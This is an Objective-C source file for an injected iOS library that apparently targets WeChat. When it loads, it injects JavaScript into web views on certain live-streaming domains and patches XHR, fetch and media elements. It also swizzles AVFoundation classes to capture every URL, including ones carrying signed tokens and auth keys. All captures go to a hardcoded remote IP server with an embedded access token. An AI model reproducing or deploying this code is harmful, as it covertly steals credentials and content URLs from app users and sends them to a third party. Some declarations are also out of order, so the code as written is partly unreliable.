//
// ALIAllInOneSniffer_FinalSafe.m
// Final stable "All-In-One" sniffer:
//  - JS 安全门控注入（预置到所有 frame + 主 frame 兜底）
//  - 原生兜底：AVPlayer AccessLog 监听 + optional AVURLAsset/AVPlayerItem swizzle + optional NSURLSession swizzle
//  - 强制“兜底上报”：无论是否匹配流规则，捕获的 URL 都会上报（去重窗口）
//  - 延迟/分级 hook，尽量避免启动期冲突或闪退
//
// Save as: ALIAllInOneSniffer_FinalSafe.m
// Compile/link: -framework WebKit -framework AVFoundation -framework UIKit -framework Foundation
//
// 改动点/开关：
//   AV_HOOK_ENABLED        - 是否启用 AVURLAsset/AVPlayerItem swizzle（默认 YES）
//   URLSESSION_HOOK_ENABLED- 是否启用 NSURLSession hooks（默认 NO，容易冲突）
//   kForceUploadAll        - 是否强制上传所有捕获（即使不匹配流规则）
//   kShowPopupOnHit        - 是否弹窗并复制捕获到的 URL
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <AVFoundation/AVFoundation.h>
#import <objc/runtime.h>

#pragma mark - 开关 & 配置

// 分级开关：更稳的默认设置
static const BOOL AV_HOOK_ENABLED         = YES;   // 较安全，通常不会导致启动冲突
static const BOOL URLSESSION_HOOK_ENABLED = NO;    // 默认关闭，若需要可改为 YES
static const BOOL kForceUploadAll         = YES;   // 兜底：所有捕获（哪怕不匹配）都上传
static const BOOL kShowPopupOnHit         = YES;   // 捕获命中时弹窗并复制
static const BOOL kShowPopupOnInject      = YES;   // 注入成功弹窗

// 上报地址（你的服务器）
static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }

// 其他参数
static const NSTimeInterval kScanInterval   = 1.2;   // 扫描 WKWebView 间隔
static const NSTimeInterval kInjectDelay    = 0.6;   // 满足条件后延迟注入
static const NSTimeInterval kDedupeWindow   = 60.0;  // URL 去重窗口
static const double kProgressThreshold     = 0.6;   // estimatedProgress 门限（0.6）

// 目标 host（匹配时触发注入/延迟安装原生 hooks）
static NSArray<NSString*> *TargetHosts(void) {
    return @[@"ukmdg.cn", @"vzuk.ukmdg.cn", @"wehfws.vzuk.ukmdg.cn", @"vzan.com", @"weizan.com"];
}

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[ALI] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

#pragma mark - 全局/工具

static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;
static BOOL g_avHooksInstalled = NO;
static id g_accessLogToken1 = nil;
static id g_accessLogToken2 = nil;
static ALIMessageHandler *g_handler_for_all = nil; // 前向声明后面赋值

static inline void on_main(void(^blk)(void)){
    if (!blk) return;
    if (NSThread.isMainThread) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}

static UIWindow *keyWin(void){
    UIWindow *win = nil;
    if (@available(iOS 13.0,*)) {
        for (UIScene *s in UIApplication.sharedApplication.connectedScenes) {
            if (![s isKindOfClass:[UIWindowScene class]]) continue;
            UIWindowScene *sc = (UIWindowScene*)s;
            if (sc.activationState==UISceneActivationStateForegroundActive) {
                for (UIWindow *w in sc.windows) if (w.isKeyWindow){ win=w; break; }
                if (win) break;
            }
        }
    }
    if (!win) win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
    return win;
}

static void popup(NSString *title, NSString *msg, NSString *copyText){
    if (!msg) return;
    on_main(^{
        @try{
            UIWindow *w = keyWin(); if (!w) return;
            UIViewController *vc = w.rootViewController;
            while (vc.presentedViewController) vc = vc.presentedViewController;
            UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
            if (copyText.length){
                [ac addAction:[UIAlertAction actionWithTitle:@"复制" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
                    UIPasteboard.generalPasteboard.string = copyText;
                }]];
            }
            [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [vc presentViewController:ac animated:YES completion:nil];
        }@catch(__unused NSException *e){}
    });
}

#pragma mark - 匹配、去重、强制兜底判断

static BOOL looksLikeStream(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    // 常见媒体扩展或协议
    if ([s containsString:@".m3u8"]||[s containsString:@".flv"]||[s containsString:@".mp4"]||
        [s containsString:@".ts"]  ||[s hasPrefix:@"rtmp://"]) return YES;
    // 关键字或签名参数
    if ([s containsString:@"auth_key="]||[s containsString:@"txsecret"]||[s containsString:@"txkey"]||
        [s containsString:@"token="]||[s containsString:@"sign="]||[s containsString:@"auth="]) return YES;
    // 业务相关猜测字符串（微赞/vzan/ukmdg 等）
    if ([s containsString:@"phonelive"]||[s containsString:@"vzan"]||[s containsString:@"weizan"]||
        [s containsString:@"ukmdg"]||[s containsString:@"vzuk"]||[s containsString:@"wehfws"]) return YES;
    return NO;
}

static BOOL dedupe_skip(NSString *u){
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *last = g_seen[u], *now = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; skip = NO; }
    });
    return skip;
}

#pragma mark - 上报（无闭包自捕获链式重试）

static void _ali_post_chain(NSArray<NSString*> *paths, NSUInteger idx, NSData *body) {
    if (idx >= paths.count) return;
    NSString *url = [kPushHost stringByAppendingString:paths[idx]];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
    req.HTTPMethod = @"POST";
    [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
    [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
    [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
    req.HTTPBody = body;
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e) {
        NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
        if (e || sc < 200 || sc >= 300) _ali_post_chain(paths, idx + 1, body);
    }] resume];
}

static void postText(NSString *text){
    if (!text) return;
    _ali_post_chain(kPushPaths(), 0, [text dataUsingEncoding:NSUTF8StringEncoding]);
}

static NSString *jsonStringify(NSDictionary *obj){
    if (!obj) return nil;
    NSData *d = [NSJSONSerialization dataWithJSONObject:obj options:0 error:nil];
    return d ? [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] : nil;
}

#pragma mark - 统一事件处理（JS/Native 共用）

static void handleRawEvent(NSDictionary *evt){
    // evt 来自 JS，结构类似 { type: "FETCH_RSP", from: "fetch", url: "...", sample: "...", ts: ... }
    NSString *js = jsonStringify(evt);
    if (js) postText(js); // 上报原始事件

    NSString *u = evt[@"url"];
    if (!u) return;

    // 兜底：如果 kForceUploadAll 为 YES，或者 looksLikeStream 为 YES，都会弹窗/复制并上报 NATIVE_HIT-like 事件（去重）
    BOOL like = looksLikeStream(u);
    if (kForceUploadAll || like) {
        if (!dedupe_skip(u)) {
            if (kShowPopupOnHit) {
                UIPasteboard.generalPasteboard.string = u;
                NSString *from = evt[@"from"] ?: evt[@"type"] ?: @"inpage";
                popup(@"抓到URL", [NSString stringWithFormat:@"%@\n%@", from, u], u);
            }
            // 额外上报一个“命中”事件，方便服务器端筛选
            NSDictionary *hit = @{@"type": @"JS_HIT",
                                  @"from": evt[@"from"] ?: evt[@"type"] ?: @"inpage",
                                  @"url": u,
                                  @"page": evt[@"page"] ?: @"",
                                  @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
            NSString *s = jsonStringify(hit);
            if (s) postText(s);
        }
    }
}

static void handleCapturedURL(NSString *url, NSString *from){
    if (!url) return;
    // 强制上报：如果之前短时间内已上报则 skip（dedupe），否则上报
    if (dedupe_skip(url)) { LOG(@"dup skip native %@", url); return; }

    // always upload raw capture
    NSDictionary *evt = @{@"type": @"NATIVE_HIT",
                          @"from": from?:@"native",
                          @"url": url?:@"",
                          @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
    NSString *s = jsonStringify(evt);
    if (s) postText(s);

    if (kShowPopupOnHit && looksLikeStream(url)) {
        UIPasteboard.generalPasteboard.string = url;
        popup(@"捕获播放/请求 URL", [NSString stringWithFormat:@"%@\n%@", from?:@"native", url], url);
    }
}

#pragma mark - JS 注入脚本（inpage）
// 注：脚本里 send('INJECT_OK') / send('PING_FROM_NATIVE') 等消息会回到 userContentController 里处理
static NSString *inpageJS(void){
    return @
    "(function(){try{"
      "function send(t,data){try{var p=data||{};p.type=t;p.ts=Date.now();p.page=location.href;p.ua=navigator.userAgent;"
        "if(window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.__ALI_SNIF__){window.webkit.messageHandlers.__ALI_SNIF__.postMessage(p);}else{console.log('[ALI_SNIF]',p);window.__ALI_SNIF_LAST__=p;}}catch(e){}}"
      "function looks(u){if(!u) return false; u=(u+'').toLowerCase();"
        "if(u.indexOf('.m3u8')!=-1||u.indexOf('.flv')!=-1||u.indexOf('.ts')!=-1||u.indexOf('.mp4')!=-1) return true;"
        "if(u.indexOf('auth_key=')!=-1||u.indexOf('txsecret')!=-1||u.indexOf('txkey')!=-1||u.indexOf('token=')!=-1||u.indexOf('sign=')!=-1||u.indexOf('auth=')!=-1) return true;"
        "if(u.indexOf('phonelive')!=-1||u.indexOf('vzan')!=-1||u.indexOf('weizan')!=-1||u.indexOf('ukmdg')!=-1||u.indexOf('vzuk')!=-1||u.indexOf('wehfws')!=-1) return true;"
        "return false;}"
      "send('INJECT_OK',{});"
      // XHR patch
      "(function(){var O=XMLHttpRequest.prototype.open,S=XMLHttpRequest.prototype.send;"
        "if(XMLHttpRequest.prototype.__ali_patched__) return; XMLHttpRequest.prototype.__ali_patched__=true;"
        "XMLHttpRequest.prototype.open=function(m,u){try{this.__ali_u=u?u.toString():'';this.__ali_m=(m||'').toString();}catch(e){}return O.apply(this,arguments)};"
        "XMLHttpRequest.prototype.send=function(b){try{var self=this,u=self.__ali_u||'',m=self.__ali_m||'';if(u){send('XHR_REQ',{from:'xhr',url:u,method:m});}"
          "var onload=function(){try{var ct=(self.getResponseHeader?self.getResponseHeader('Content-Type'):'')||'';var st=(self.status||0);var sample=null;"
            "if(ct.toLowerCase().indexOf('mpegurl')!=-1&&self.responseText){sample=self.responseText.slice(0,256);}else if(self.responseText&&self.responseText.indexOf('#EXTM3U')!=-1){sample=self.responseText.slice(0,256);ct=ct||'application/vnd.apple.mpegurl';}"
            "send('XHR_RSP',{from:'xhr',url:u,method:m,status:st,ctype:ct,sample:sample});if(looks(u))send('HIT',{from:'xhr',url:u});}catch(e){}};"
          "this.addEventListener&&this.addEventListener('load',onload);}catch(e){}return S.apply(this,arguments)};"
      "})();"
      // fetch patch
      "(function(){if(!window.fetch||window.fetch.__ali_patched__) return; var F=window.fetch; window.fetch.__ali_patched__=true;"
        "window.fetch=function(i,init){try{var u=(typeof i==='string')?i:(i&&i.url)||'';var m=(init&&init.method)||'GET'; if(u) send('FETCH_REQ',{from:'fetch',url:u,method:m});"
          "return F.apply(this,arguments).then(function(r){try{var ct=r.headers&&r.headers.get&&r.headers.get('content-type')||'';var st=r.status||0; var c=r.clone&&r.clone();"
            "if(c&&c.text){c.text().then(function(t){var sample=null; if(t&&t.indexOf('#EXTM3U')!=-1){sample=t.slice(0,256); if(!ct) ct='application/vnd.apple.mpegurl';}"
              "send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct,sample:sample});}).catch(function(){send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});});}"
            "else{send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});} if(looks(u)) send('HIT',{from:'fetch',url:u});}catch(e){} return r;});}catch(e){return F.apply(this,arguments);}};"
      "})();"
      // PerformanceObserver resource
      "(function(){if(!('PerformanceObserver' in window) || window.__ali_perf__) return; window.__ali_perf__=true;"
        "try{var seen=new Set(); var ob=new PerformanceObserver(function(list){try{var arr=list.getEntries(); for(var i=0;i<arr.length;i++){ var e=arr[i]; var u=e.name||''; if(!u||seen.has(u)) continue; seen.add(u); send('RES',{from:'perf',url:u,initiator:e.initiatorType||''}); if(looks(u)) send('HIT',{from:'perf',url:u}); }}catch(e){}}); ob.observe({type:'resource',buffered:true});}catch(e){}"
      "})();"
      // <video>/<audio> observe and setAttribute patch
      "(function(){if(window.__ali_media__) return; window.__ali_media__=true;"
        "function report(el,tag,ev){try{var s=el.currentSrc||el.src||((el.querySelector&&el.querySelector('source'))||{}).src||''; if(s){ send('MEDIA',{from:tag+':'+ev,url:s}); if(looks(s)) send('HIT',{from:tag,url:s}); }}catch(e){} }"
        "var obs=new MutationObserver(function(a){ a.forEach(function(m){ if(m.addedNodes){ for(var i=0;i<m.addedNodes.length;i++){ var n=m.addedNodes[i]; if(n&&n.tagName){ var t=n.tagName.toLowerCase(); if(t==='video'||t==='audio'){ report(n,t,'add'); n.addEventListener&&n.addEventListener('play',function(){ report(this,t,'play')}, false); } } if(n&&n.querySelectorAll){ var vs=n.querySelectorAll('video,audio'); for(var j=0;j<vs.length;j++){ var t2=vs[j].tagName.toLowerCase(); report(vs[j],t2,'sub'); vs[j].addEventListener&&vs[j].addEventListener('play',function(){ report(this,this.tagName.toLowerCase(),'play')},false); } } } } }); });"
        "obs.observe(document.documentElement||document.body,{childList:true,subtree:true});"
        "var vs=document.querySelectorAll&&document.querySelectorAll('video,audio'); for(var k=0;k<(vs?vs.length:0);k++){ var t=vs[k].tagName.toLowerCase(); report(vs[k],t,'init'); vs[k].addEventListener&&vs[k].addEventListener('play',function(){ report(this,this.tagName.toLowerCase(),'play')},false);} "
        "var setA=Element.prototype.setAttribute; if(!Element.prototype.__ali_setattr__){ Element.prototype.__ali_setattr__=true; Element.prototype.setAttribute=function(k,v){ try{ if(this.tagName){ var t=this.tagName.toLowerCase(); if((t==='video'||t==='audio')&&k&&k.toLowerCase()==='src'){ send('MEDIA_SET',{from:'setAttr',url:v}); if(looks(v)) send('HIT',{from:'setAttr',url:v}); } } }catch(e){} return setA.apply(this,arguments)}; }"
      "})();"
      "console.log('[ALI_SNIF] injected (finalsafe)');"
    "}catch(e){console.log('[ALI_SNIF] inject error', e);} })();";
}

#pragma mark - Message Handler

@interface ALIMessageHandler : NSObject <WKScriptMessageHandler>
@end
@implementation ALIMessageHandler
- (void)userContentController:(WKUserContentController *)userContentController
      didReceiveScriptMessage:(WKScriptMessage *)message {
    if (![message.body isKindOfClass:[NSDictionary class]]) return;
    handleRawEvent((NSDictionary *)message.body);
}
@end

#pragma mark - Helper: prime userScript for all frames

static void prime_userScript_for_allFrames(WKWebView *wv) {
    if (!wv) return;
    @try {
        WKUserContentController *ucc = wv.configuration.userContentController;
        // 防止重复添加同一脚本
        for (WKUserScript *s in ucc.userScripts) {
            if ([s.source containsString:@"[ALI_SNIF] injected (finalsafe)"]) return;
        }
        NSString *src = inpageJS();
        WKUserScript *us = [[WKUserScript alloc] initWithSource:src
                                                  injectionTime:WKUserScriptInjectionTimeAtDocumentEnd
                                               forMainFrameOnly:NO];
        [ucc addUserScript:us];
        // 确保 handler 清理（避免重复）
        if ([ucc respondsToSelector:@selector(removeScriptMessageHandlerForName:)]) {
            @try{ [ucc removeScriptMessageHandlerForName:@"__ALI_SNIF__"]; }@catch(__unused NSException *e){}
        }
    } @catch(__unused NSException *e) {}
}

#pragma mark - host match & injection timing

static const void *kInjectedKey = &kInjectedKey;
static const void *kKVOKey      = &kKVOKey;

static BOOL hostMatches(NSURL *url){
    if (!url.host) return NO;
    NSString *h = url.host.lowercaseString;
    for (NSString *pat in TargetHosts()){
        if ([h hasSuffix:pat.lowercaseString]) return YES;
    }
    return NO;
}

static void try_inject_when_ready(WKWebView *wv){
    if (!wv) return;
    if (wv.estimatedProgress < kProgressThreshold) return;

    [wv evaluateJavaScript:@"document.readyState" completionHandler:^(id val, NSError *err){
        if (err) return;
        NSString *rs = [val isKindOfClass:NSString.class] ? (NSString*)val : @"";
        if (![rs isEqualToString:@"complete"] && ![rs isEqualToString:@"interactive"]) return;

        NSNumber *flag = objc_getAssociatedObject(wv, kInjectedKey);
        if (flag.boolValue) return;

        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kInjectDelay * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            NSURL *u = wv.URL; if (!hostMatches(u)) return;

            objc_setAssociatedObject(wv, kInjectedKey, @(YES), OBJC_ASSOCIATION_RETAIN_NONATOMIC);

            // 安全注册 handler：先尝试移除再 add（避免重复）
            @try{
                if (!g_handler_for_all) g_handler_for_all = [ALIMessageHandler new];
                if ([wv.configuration.userContentController respondsToSelector:@selector(removeScriptMessageHandlerForName:)]) {
                    [wv.configuration.userContentController removeScriptMessageHandlerForName:@"__ALI_SNIF__"];
                }
                [wv.configuration.userContentController addScriptMessageHandler:g_handler_for_all name:@"__ALI_SNIF__"];
            }@catch(__unused NSException *e){}

            // Evaluate main-frame JS as兜底
            NSString *js = inpageJS();
            [wv evaluateJavaScript:js completionHandler:nil];

            // PING 确认桥可用
            NSString *ping = @"(function(){try{ if(window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.__ALI_SNIF__){ window.webkit.messageHandlers.__ALI_SNIF__.postMessage({type:'PING_FROM_NATIVE', page:location.href, ts:Date.now()}); } }catch(e){} })();";
            [wv evaluateJavaScript:ping completionHandler:nil];

            if (kShowPopupOnInject){
                popup(@"JS 注入成功", [NSString stringWithFormat:@"域名：%@\n页面已就绪，开始采集", u.host ?: @"(null)"], nil);
            }

            NSDictionary *evt = @{@"type": @"NATIVE_INJECT_OK",
                                  @"app": @"WeChat",
                                  @"page": (wv.URL.absoluteString ?: @""),
                                  @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
            NSString *s = jsonStringify(evt); if (s) postText(s);

            // 首次命中后再安装原生 AV hooks（延迟安装，降低冲突概率）
            if (AV_HOOK_ENABLED && !g_avHooksInstalled){
                g_avHooksInstalled = YES;
                dispatch_async(gq, ^{ @try{ _ali_install_av_hooks(); }@catch(__unused NSException *e){} });
            }
            // 如果需要启用 NSURLSession hooks，也在这里按策略安装
            if (URLSESSION_HOOK_ENABLED) {
                dispatch_async(gq, ^{ @try{ _ali_install_urlsession_hooks(); }@catch(__unused NSException *e){} });
            }
        });
    }];
}

#pragma mark - KVO box & scanning

@interface _ALIKVOBox : NSObject
@property (nonatomic, weak) WKWebView *wv;
@end
@implementation _ALIKVOBox
- (void)dealloc{
    @try{
        [self.wv removeObserver:self forKeyPath:@"URL"];
        [self.wv removeObserver:self forKeyPath:@"estimatedProgress"];
    }@catch(__unused NSException *e){}
}
- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)ctx{
    WKWebView *wv = (WKWebView *)object;
    if (![wv isKindOfClass:[WKWebView class]]) return;
    if ([keyPath isEqualToString:@"URL"] || [keyPath isEqualToString:@"estimatedProgress"]) {
        NSURL *u = wv.URL;
        if (hostMatches(u)) {
            // 1) 一旦 URL 命中，就预置脚本到所有 frame（覆盖后续 iframe）
            prime_userScript_for_allFrames(wv);
            // 2) 等页面就绪后再对主 frame 做 evaluate（兜底）
            try_inject_when_ready(wv);
        }
    }
}
@end

static void attach_kvo_if_needed(WKWebView *wv){
    if (!wv) return;
    _ALIKVOBox *box = objc_getAssociatedObject(wv, kKVOKey);
    if (box) return;
    box = [_ALIKVOBox new]; box.wv = wv;
    objc_setAssociatedObject(wv, kKVOKey, box, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
    @try{
        [wv addObserver:box forKeyPath:@"URL" options:NSKeyValueObservingOptionNew context:NULL];
        [wv addObserver:box forKeyPath:@"estimatedProgress" options:NSKeyValueObservingOptionNew context:NULL];
    }@catch(__unused NSException *e){}
}

static void walk_view(UIView *v){
    if (!v) return;
    Class WK = NSClassFromString(@"WKWebView");
    if (WK && [v isKindOfClass:WK]){
        WKWebView *wv = (WKWebView *)v;
        attach_kvo_if_needed(wv);
        if (hostMatches(wv.URL)) {
            prime_userScript_for_allFrames(wv);
            try_inject_when_ready(wv);
        }
    }
    for (UIView *sub in v.subviews) walk_view(sub);
}

static void scan_loop(void){
    on_main(^{
        @try{
            for (UIWindow *w in UIApplication.sharedApplication.windows) walk_view(w);
        }@catch(__unused NSException *e){}
    });
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kScanInterval * NSEC_PER_SEC)), gq, ^{ scan_loop(); });
}

#pragma mark - AV AccessLog Observers (safe, no swizzle required)

static void installAVObservers(void){
    @try{
        NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
        if (!g_accessLogToken1){
            g_accessLogToken1 = [nc addObserverForName:AVPlayerItemNewAccessLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *note){
                @try{
                    id item = note.object; if (!item) return;
                    if ([item respondsToSelector:@selector(accessLog)]) {
                        id log = [item accessLog];
                        if (log && [log respondsToSelector:@selector(events)]) {
                            NSArray *events = [log events];
                            if (events.count){
                                id ev = events.lastObject;
                                if (ev && [ev respondsToSelector:NSSelectorFromString(@"URI")]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                                    NSString *uri = [ev performSelector:NSSelectorFromString(@"URI")];
#pragma clang diagnostic pop
                                    if (uri.length) dispatch_async(gq, ^{ handleCapturedURL(uri, @"AVAccessLog"); });
                                }
                            }
                        }
                    }
                }@catch(__unused NSException *e){}
            }];
        }
        if (!g_accessLogToken2){
            g_accessLogToken2 = [nc addObserverForName:AVPlayerItemNewErrorLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *note){
                @try{
                    id item = note.object; if (!item) return;
                    if ([item respondsToSelector:@selector(errorLog)]) {
                        id log = [item errorLog];
                        if (log && [log respondsToSelector:@selector(events)]) {
                            for (id ev in [log events]){
                                if (ev && [ev respondsToSelector:NSSelectorFromString(@"URI")]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                                    NSString *uri = [ev performSelector:NSSelectorFromString(@"URI")];
#pragma clang diagnostic pop
                                    if (uri.length) dispatch_async(gq, ^{ handleCapturedURL(uri, @"AVErrorLog"); });
                                }
                            }
                        }
                    }
                }@catch(__unused NSException *e){}
            }];
        }
    }@catch(__unused NSException *e){}
}

#pragma mark - Native hooks (swizzle) - AV & optional NSURLSession

// Declarations for orig impl pointers
static id (*orig_AVURLAsset_initWithURL_options)(id, SEL, NSURL *, NSDictionary *);
static id (*orig_AVPlayerItem_initWithURL)(id, SEL, NSURL *);
static NSURLSessionTask* (*orig_NSURLSession_dataTaskWithRequest)(id, SEL, NSURLRequest *);
static NSURLSessionTask* (*orig_NSURLSession_dataTaskWithURL)(id, SEL, NSURL *);

static id replaced_AVURLAsset_initWithURL_options(id self, SEL _cmd, NSURL *URL, NSDictionary *options){
    @try{ if (URL.absoluteString) dispatch_async(gq, ^{ handleCapturedURL(URL.absoluteString, @"AVURLAsset"); }); }@catch(__unused NSException *e){}
    return orig_AVURLAsset_initWithURL_options(self, _cmd, URL, options);
}
static id replaced_AVPlayerItem_initWithURL(id self, SEL _cmd, NSURL *URL){
    @try{ if (URL.absoluteString) dispatch_async(gq, ^{ handleCapturedURL(URL.absoluteString, @"AVPlayerItem"); }); }@catch(__unused NSException *e){}
    return orig_AVPlayerItem_initWithURL(self, _cmd, URL);
}
static NSURLSessionTask* replaced_NSURLSession_dataTaskWithRequest(id self, SEL _cmd, NSURLRequest *req){
    @try{ NSURL *u = req.URL; if (u.absoluteString) dispatch_async(gq, ^{ handleCapturedURL(u.absoluteString, @"NSURLSession(Request)"); }); }@catch(__unused NSException *e){}
    return orig_NSURLSession_dataTaskWithRequest(self, _cmd, req);
}
static NSURLSessionTask* replaced_NSURLSession_dataTaskWithURL(id self, SEL _cmd, NSURL *url){
    @try{ if (url.absoluteString) dispatch_async(gq, ^{ handleCapturedURL(url.absoluteString, @"NSURLSession(URL)"); }); }@catch(__unused NSException *e){}
    return orig_NSURLSession_dataTaskWithURL(self, _cmd, url);
}

static void swizzle_instance_method(Class cls, SEL sel, IMP newImp, const char *types){
    Method m = class_getInstanceMethod(cls, sel);
    if (!m) {
        class_addMethod(cls, sel, newImp, types);
        return;
    }
    method_setImplementation(m, newImp);
}

static void _ali_install_urlsession_hooks(void){
    if (!URLSESSION_HOOK_ENABLED) return;
    @try{
        Class cNSURLSession = NSClassFromString(@"NSURLSession");
        if (!cNSURLSession) return;
        SEL sel3 = @selector(dataTaskWithRequest:);
        Method m3 = class_getInstanceMethod(cNSURLSession, sel3);
        if (m3){ orig_NSURLSession_dataTaskWithRequest = (void*)method_getImplementation(m3);
            swizzle_instance_method(cNSURLSession, sel3, (IMP)replaced_NSURLSession_dataTaskWithRequest, method_getTypeEncoding(m3)); }
        SEL sel4 = @selector(dataTaskWithURL:);
        Method m4 = class_getInstanceMethod(cNSURLSession, sel4);
        if (m4){ orig_NSURLSession_dataTaskWithURL = (void*)method_getImplementation(m4);
            swizzle_instance_method(cNSURLSession, sel4, (IMP)replaced_NSURLSession_dataTaskWithURL, method_getTypeEncoding(m4)); }
        LOG(@"URLSession hooks installed (optional)");
    }@catch(__unused NSException *e){}
}

void _ali_install_av_hooks(void){
    @try{
        // 安装 AccessLog 监听（安全）
        installAVObservers();

        if (AV_HOOK_ENABLED){
            Class cAVURLAsset = NSClassFromString(@"AVURLAsset");
            if (cAVURLAsset){
                SEL sel1 = @selector(initWithURL:options:);
                Method m1 = class_getInstanceMethod(cAVURLAsset, sel1);
                if (m1){
                    orig_AVURLAsset_initWithURL_options = (void*)method_getImplementation(m1);
                    swizzle_instance_method(cAVURLAsset, sel1, (IMP)replaced_AVURLAsset_initWithURL_options, method_getTypeEncoding(m1));
                    LOG(@"swizzled AVURLAsset initWithURL:options:");
                }
            }
            Class cAVPlayerItem = NSClassFromString(@"AVPlayerItem");
            if (cAVPlayerItem){
                SEL sel2 = @selector(initWithURL:);
                Method m2 = class_getInstanceMethod(cAVPlayerItem, sel2);
                if (m2){
                    orig_AVPlayerItem_initWithURL = (void*)method_getImplementation(m2);
                    swizzle_instance_method(cAVPlayerItem, sel2, (IMP)replaced_AVPlayerItem_initWithURL, method_getTypeEncoding(m2));
                    LOG(@"swizzled AVPlayerItem initWithURL:");
                }
            }
        }

        // Optionally install URLSession hooks
        _ali_install_urlsession_hooks();

        // notify ready
        NSDictionary *evt = @{@"type": @"NATIVE_HOOKS_READY", @"app": @"WeChat", @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
        NSString *s = jsonStringify(evt); if (s) postText(s);

    }@catch(__unused NSException *e){}
}

#pragma mark - Entrypoint

__attribute__((constructor))
static void ALIAllInOneSniffer_FinalSafeInit(void){
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        if (!gq) gq = dispatch_queue_create("com.ali.allinone.finalsafe", DISPATCH_QUEUE_SERIAL);
        if (!g_seen) g_seen = [NSMutableDictionary dictionary];

        // Start scanning for WKWebView (safe: non-invasive)
        scan_loop();

        // Do not eagerly install AV hooks; they are installed after first successful injection or first host hit.
        // However we can prepare AV access log observers early (safe) to catch accessLog events even before swizzle.
        installAVObservers();

        // Report loader ready
        NSDictionary *evt = @{@"type": @"LOADER_INIT", @"app": @"WeChat", @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
        NSString *s = jsonStringify(evt); if (s) postText(s);
        LOG(@"ALIAllInOneSniffer_FinalSafe initialized");
    });
}

#pragma mark - End of file
